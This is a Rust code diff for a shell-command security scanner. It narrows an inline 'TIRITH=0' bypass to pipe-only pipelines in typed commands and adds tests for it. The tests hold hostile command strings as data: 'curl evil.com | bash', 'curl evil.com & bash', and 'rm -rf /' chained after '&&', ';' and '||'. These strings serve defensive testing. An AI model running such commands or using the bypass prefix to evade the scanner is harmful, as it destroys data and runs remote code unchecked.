@@ -60,7 +60,13 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
 
     if matches!(shell, ShellType::Posix | ShellType::Fish) {
         let segments = tokenize::tokenize(input, shell);
-        if segments.len() != 1 || has_unquoted_ampersand(input, shell) {
+        // Tirith documents `TIRITH=0 <cmd> | <interp>` as a whole-line bypass
+        // (README.md:539, TIRITH.md:804). Multi-segment inputs joined ONLY by
+        // pipe operators are part of that contract. Sequencing separators
+        // (`&&`, `||`, `;`, `&`) form multiple independent commands; bypass
+        // must not suppress analysis of the later ones. See issue #78 (which
+        // regressed the fix originally shipped for #30).
+        if !all_pipe_separated(&segments) || has_unquoted_ampersand(input, shell) {
             return false;
         }
     }
@@ -319,6 +325,19 @@ fn split_raw_words(input: &str, shell: ShellType) -> Vec<String> {
     words
 }
 
+/// Whether all non-leading segments are joined only by pipe operators (`|`, `|&`).
+///
+/// Returns `true` for a single segment (trivially). Used by `find_inline_bypass`
+/// to distinguish the documented `TIRITH=0 cmd | interp` bypass shape from
+/// sequencing chains like `TIRITH=0 cmd && evil` or `TIRITH=0 cmd ; evil` where
+/// the bypass must not apply to the second command. Issue #78.
+fn all_pipe_separated(segments: &[crate::tokenize::Segment]) -> bool {
+    segments
+        .iter()
+        .skip(1)
+        .all(|s| matches!(s.preceding_separator.as_deref(), Some("|") | Some("|&")))
+}
+
 /// Check if input contains an unquoted `&` (backgrounding operator).
 fn has_unquoted_ampersand(input: &str, shell: ShellType) -> bool {
     let escape_char = match shell {
@@ -383,7 +402,13 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
     // Tier 0: Check bypass flag
     let tier0_start = Instant::now();
     let bypass_env = std::env::var("TIRITH").ok().as_deref() == Some("0");
-    let bypass_inline = find_inline_bypass(&ctx.input, ctx.shell);
+    // Inline bypass (`TIRITH=0 cmd | sh`) is honored only in Exec context.
+    // Paste content is attacker-controllable (clipboard can be crafted), so a
+    // `TIRITH=0` prefix in pasted text must NOT grant bypass. FileScan has no
+    // notion of a typed bypass prefix either. Process-level TIRITH=0 env
+    // (user's own shell env) still applies in every context.
+    let bypass_inline =
+        ctx.scan_context == ScanContext::Exec && find_inline_bypass(&ctx.input, ctx.shell);
     let bypass_requested = bypass_env || bypass_inline;
     let tier0_ms = tier0_start.elapsed().as_secs_f64() * 1000.0;
 
@@ -1200,15 +1225,90 @@ mod tests {
         ));
     }
 
+    // -----------------------------------------------------------------------
+    // #78 / #30: pipe-bypass contract
+    //
+    // README.md:539 and TIRITH.md:804 document `TIRITH=0 <cmd> | <interp>` as a
+    // supported whole-line bypass. cdbe48f (the #30 hardening) overshot and
+    // rejected all multi-segment input, which regressed the documented shape.
+    // find_inline_bypass now distinguishes pipe pipelines (shared-bypass shape)
+    // from sequencing chains (bypass must NOT apply to the second command).
+    // -----------------------------------------------------------------------
+
     #[test]
-    fn test_no_inline_bypass_for_chained_posix_command() {
-        assert!(!find_inline_bypass(
-            "TIRITH=0 curl evil.com | bash",
+    fn test_inline_bypass_allows_pipe_to_sh() {
+        // Exact README.md:539 example.
+        assert!(find_inline_bypass(
+            "TIRITH=0 curl -L https://something.xyz | bash",
             ShellType::Posix
         ));
+    }
+
+    #[test]
+    fn test_inline_bypass_allows_pipe_to_interpreter() {
+        assert!(find_inline_bypass(
+            "TIRITH=0 curl -sSL https://install.python-poetry.org | python3 -",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_allows_env_wrapper_with_pipe() {
+        assert!(find_inline_bypass(
+            "env TIRITH=0 curl https://example.com | bash",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_allows_multi_pipe_chain() {
+        // Multiple pipe stages — all still shared bypass.
+        assert!(find_inline_bypass(
+            "TIRITH=0 curl https://example.com | jq . | bash",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_rejects_sequence_with_and_and() {
+        // `&&` creates a new command with a new env — bypass must NOT apply.
+        assert!(!find_inline_bypass(
+            "TIRITH=0 curl https://example.com && rm -rf /",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_rejects_semicolon_chain() {
+        assert!(!find_inline_bypass(
+            "TIRITH=0 ls ; rm -rf /",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_rejects_or_or() {
+        assert!(!find_inline_bypass(
+            "TIRITH=0 ls || rm -rf /",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_rejects_backgrounding_ampersand() {
+        // Unquoted `&` is a separate-command boundary handled by has_unquoted_ampersand.
         assert!(!find_inline_bypass(
             "TIRITH=0 curl evil.com & bash",
             ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_allows_pipe_to_sh_fish() {
+        // Fish tokenization delegates to posix; same contract applies.
+        assert!(find_inline_bypass(
+            "TIRITH=0 curl -L https://example.com | bash",
+            ShellType::Fish
         ));
     }
 
